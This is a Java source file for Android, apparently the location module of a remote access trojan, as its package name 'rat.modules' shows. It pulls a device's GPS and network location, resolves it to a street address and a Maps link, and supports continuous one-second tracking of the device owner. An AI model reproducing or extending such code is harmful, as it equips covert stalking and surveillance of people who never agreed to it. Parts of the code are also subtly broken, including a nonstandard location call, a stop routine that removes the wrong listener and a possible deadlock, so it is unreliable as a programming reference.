package com.fly0rakoon.rat.modules;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.location.Address;
import android.location.Geocoder;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.os.Looper;
import android.util.Log;

import androidx.core.content.ContextCompat;

import java.io.IOException;
import java.util.List;
import java.util.Locale;

public class LocationModule {
    
    private static final String TAG = "LocationModule";
    private static final long MIN_TIME = 1000; // 1 second
    private static final float MIN_DISTANCE = 0; // 0 meters
    
    private Context context;
    private LocationManager locationManager;
    private Location lastLocation = null;
    private boolean isListening = false;
    
    public LocationModule(Context context) {
        this.context = context;
        this.locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
    }
    
    public String getLocation() {
        // Check permissions
        if (!checkLocationPermissions()) {
            return "ERROR: Location permissions not granted";
        }
        
        // Check if GPS is enabled
        if (!isGpsEnabled()) {
            return "ERROR: GPS is disabled";
        }
        
        try {
            // Try to get last known location first
            Location lastKnown = getLastKnownLocation();
            if (lastKnown != null) {
                lastLocation = lastKnown;
                return formatLocation(lastKnown);
            }
            
            // If no last known, request a single update
            Location singleUpdate = getSingleLocation();
            if (singleUpdate != null) {
                lastLocation = singleUpdate;
                return formatLocation(singleUpdate);
            }
            
            return "ERROR: Could not get location";
            
        } catch (SecurityException e) {
            Log.e(TAG, "Security exception: " + e.getMessage());
            return "ERROR: Security exception - " + e.getMessage();
        } catch (Exception e) {
            Log.e(TAG, "Error getting location: " + e.getMessage());
            return "ERROR: " + e.getMessage();
        }
    }
    
    private boolean checkLocationPermissions() {
        return ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED ||
               ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED;
    }
    
    private boolean isGpsEnabled() {
        return locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER) ||
               locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER);
    }
    
    private Location getLastKnownLocation() throws SecurityException {
        Location bestLocation = null;
        
        // Try GPS provider
        if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
            Location gpsLocation = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (gpsLocation != null && isBetterLocation(gpsLocation, bestLocation)) {
                bestLocation = gpsLocation;
            }
        }
        
        // Try Network provider
        if (locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
            Location networkLocation = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            if (networkLocation != null && isBetterLocation(networkLocation, bestLocation)) {
                bestLocation = networkLocation;
            }
        }
        
        return bestLocation;
    }
    
    private Location getSingleLocation() throws SecurityException, InterruptedException {
        final Object lock = new Object();
        final Location[] locationResult = new Location[1];
        
        LocationListener locationListener = new LocationListener() {
            @Override
            public void onLocationChanged(Location location) {
                synchronized (lock) {
                    locationResult[0] = location;
                    lock.notify();
                }
            }
            
            @Override
            public void onStatusChanged(String provider, int status, Bundle extras) {}
            
            @Override
            public void onProviderEnabled(String provider) {}
            
            @Override
            public void onProviderDisabled(String provider) {}
        };
        
        // Request location updates
        if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
            locationManager.requestSingleLocation(LocationManager.GPS_PROVIDER, locationListener, Looper.getMainLooper());
        } else if (locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
            locationManager.requestSingleLocation(LocationManager.NETWORK_PROVIDER, locationListener, Looper.getMainLooper());
        }
        
        // Wait for location (max 10 seconds)
        synchronized (lock) {
            lock.wait(10000);
        }
        
        // Remove updates
        locationManager.removeUpdates(locationListener);
        
        return locationResult[0];
    }
    
    public void startContinuousTracking(LocationListener listener) {
        if (!checkLocationPermissions() || !isGpsEnabled() || isListening) {
            return;
        }
        
        try {
            isListening = true;
            
            if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                locationManager.requestLocationUpdates(
                    LocationManager.GPS_PROVIDER,
                    MIN_TIME,
                    MIN_DISTANCE,
                    listener
                );
            }
            
            if (locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                locationManager.requestLocationUpdates(
                    LocationManager.NETWORK_PROVIDER,
                    MIN_TIME,
                    MIN_DISTANCE,
                    listener
                );
            }
            
        } catch (SecurityException e) {
            Log.e(TAG, "Security exception starting tracking: " + e.getMessage());
            isListening = false;
        }
    }
    
    public void stopContinuousTracking() {
        if (isListening) {
            locationManager.removeUpdates(new LocationListener() {
                @Override
                public void onLocationChanged(Location location) {}
                @Override
                public void onStatusChanged(String provider, int status, Bundle extras) {}
                @Override
                public void onProviderEnabled(String provider) {}
                @Override
                public void onProviderDisabled(String provider) {}
            });
            isListening = false;
        }
    }
    
    private String formatLocation(Location location) {
        if (location == null) {
            return "No location available";
        }
        
        StringBuilder result = new StringBuilder();
        result.append("Location:\n");
        result.append(String.format(Locale.US, "  Latitude: %.6f\n", location.getLatitude()));
        result.append(String.format(Locale.US, "  Longitude: %.6f\n", location.getLongitude()));
        result.append(String.format(Locale.US, "  Accuracy: %.1f meters\n", location.getAccuracy()));
        
        if (location.hasAltitude()) {
            result.append(String.format(Locale.US, "  Altitude: %.1f meters\n", location.getAltitude()));
        }
        
        if (location.hasSpeed()) {
            result.append(String.format(Locale.US, "  Speed: %.1f m/s\n", location.getSpeed()));
        }
        
        if (location.hasBearing()) {
            result.append(String.format(Locale.US, "  Bearing: %.1f degrees\n", location.getBearing()));
        }
        
        result.append("  Provider: ").append(location.getProvider()).append("\n");
        
        // Get address from coordinates
        String address = getAddressFromLocation(location.getLatitude(), location.getLongitude());
        if (address != null) {
            result.append("  Address: ").append(address).append("\n");
        }
        
        // Get Google Maps link
        String mapsLink = String.format(Locale.US, 
            "https://maps.google.com/?q=%.6f,%.6f", 
            location.getLatitude(), 
            location.getLongitude());
        result.append("  Maps: ").append(mapsLink).append("\n");
        
        return result.toString();
    }
    
    private String getAddressFromLocation(double latitude, double longitude) {
        if (!Geocoder.isPresent()) {
            return null;
        }
        
        Geocoder geocoder = new Geocoder(context, Locale.getDefault());
        try {
            List<Address> addresses = geocoder.getFromLocation(latitude, longitude, 1);
            if (addresses != null && !addresses.isEmpty()) {
                Address address = addresses.get(0);
                StringBuilder sb = new StringBuilder();
                
                for (int i = 0; i <= address.getMaxAddressLineIndex(); i++) {
                    if (i > 0) sb.append(", ");
                    sb.append(address.getAddressLine(i));
                }
                
                return sb.toString();
            }
        } catch (IOException e) {
            Log.e(TAG, "Geocoder error: " + e.getMessage());
        }
        
        return null;
    }
    
    private boolean isBetterLocation(Location location, Location currentBest) {
        if (currentBest == null) {
            return true;
        }
        
        // Check if the new location is newer
        long timeDelta = location.getTime() - currentBest.getTime();
        boolean isSignificantlyNewer = timeDelta > 1000 * 60 * 2; // 2 minutes
        boolean isSignificantlyOlder = timeDelta < -1000 * 60 * 2;
        boolean isNewer = timeDelta > 0;
        
        if (isSignificantlyNewer) {
            return true;
        } else if (isSignificantlyOlder) {
            return false;
        }
        
        // Check accuracy
        int accuracyDelta = (int) (location.getAccuracy() - currentBest.getAccuracy());
        boolean isLessAccurate = accuracyDelta > 0;
        boolean isMoreAccurate = accuracyDelta < 0;
        boolean isSignificantlyLessAccurate = accuracyDelta > 200; // 200 meters
        
        // Check provider
        boolean isFromSameProvider = isSameProvider(location.getProvider(), currentBest.getProvider());
        
        if (isMoreAccurate) {
            return true;
        } else if (isNewer && !isLessAccurate) {
            return true;
        } else if (isNewer && !isSignificantlyLessAccurate && isFromSameProvider) {
            return true;
        }
        
        return false;
    }
    
    private boolean isSameProvider(String provider1, String provider2) {
        if (provider1 == null) {
            return provider2 == null;
        }
        return provider1.equals(provider2);
    }
}